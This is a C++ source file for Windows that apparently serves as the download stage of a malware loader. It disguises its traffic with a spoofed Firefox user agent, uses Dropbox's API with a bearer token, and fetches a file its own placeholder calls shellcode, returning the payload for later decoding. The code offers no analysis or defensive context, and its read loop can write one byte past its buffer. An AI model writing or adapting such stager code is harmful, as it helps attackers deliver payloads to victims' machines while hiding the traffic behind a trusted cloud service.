#include "base64.h"
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment (lib, "Wininet.lib")

std::string Read()
{
    HINTERNET hSession = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET hConnect = InternetConnect(
        hSession,
        L"content.dropboxapi.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        L"",
        L"",
        INTERNET_SERVICE_HTTP,
        0,
        0);

    HINTERNET hHttpFile = HttpOpenRequest(
        hConnect,
        L"POST",
        L"/2/files/download",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_SECURE,
        0);

    LPCWSTR hHeaders = L"Authorization: Bearer <TOKEN>\r\n"
                        "Dropbox-API-Arg: {\"path\": \"/<PATH TO SHELLCODE>\"}\r\n"
                        "Content-Type: text/plain";

    while (!HttpSendRequest(hHttpFile, hHeaders, wcslen(hHeaders), 0, 0)) {
        printf("HttpSendRequest error : (%lu)\n", GetLastError());

        InternetErrorDlg(
            GetDesktopWindow(),
            hHttpFile,
            ERROR_INTERNET_CLIENT_AUTH_CERT_NEEDED,
            FLAGS_ERROR_UI_FILTER_FOR_ERRORS |
            FLAGS_ERROR_UI_FLAGS_GENERATE_DATA |
            FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
            NULL);
    }

    DWORD dwFileSize;
    dwFileSize = BUFSIZ;

    char* buffer;
    buffer = new char[dwFileSize + 1];
    std::string response = "";

    while (true) {
        DWORD dwBytesRead;
        BOOL bRead;

        bRead = InternetReadFile(
            hHttpFile,
            buffer,
            dwFileSize + 1,
            &dwBytesRead);

        if (dwBytesRead == 0) break;

        if (!bRead) {
            printf("InternetReadFile error : <%lu>\n", GetLastError());
        }
        else {
            buffer[dwBytesRead] = 0;
            response.append(buffer);
        }
    }

    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    return response;
}
